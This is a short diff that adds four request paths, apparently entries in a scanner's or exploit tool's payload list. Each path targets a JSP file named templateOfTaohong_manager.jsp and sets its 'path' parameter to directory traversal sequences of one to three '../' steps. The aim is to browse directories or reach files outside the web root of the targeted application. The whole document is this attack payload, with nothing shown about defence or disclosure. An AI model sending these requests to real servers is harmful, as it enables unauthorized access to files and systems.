@@ -1,0 +1,4 @@
+/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../
+/system/mediafile/templateOfTaohong_manager.jsp?path=/../../
+/system/mediafile/templateOfTaohong_manager.jsp?path=/../
+/system/mediafile/templateOfTaohong_manager.jsp?path=/
